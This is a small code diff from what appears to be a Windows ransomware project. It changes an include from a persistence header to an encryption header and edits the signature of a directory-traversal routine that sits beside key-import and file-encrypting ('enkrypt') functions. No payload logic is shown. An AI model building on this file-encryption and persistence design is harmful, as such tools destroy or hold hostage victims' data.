@@ -1,4 +1,4 @@
-#include "persistence.h"
+#include "encrypt.h"
 
 HCRYPTKEY keyimport() {
 
@@ -120,7 +120,7 @@ int enkrypt(WCHAR* srcFile, HCRYPTKEY clé) {
 	return 0;
 }
 
-bool traverse(LPCWSTR targetDir, HCRYPTKEY clé, int nLevel = 0) {
+bool traverse(LPCWSTR targetDir, HCRYPTKEY clé, int nLevel) {
 
 	WIN32_FIND_DATAW file_data;
 	WCHAR szDir[MAX_PATH];
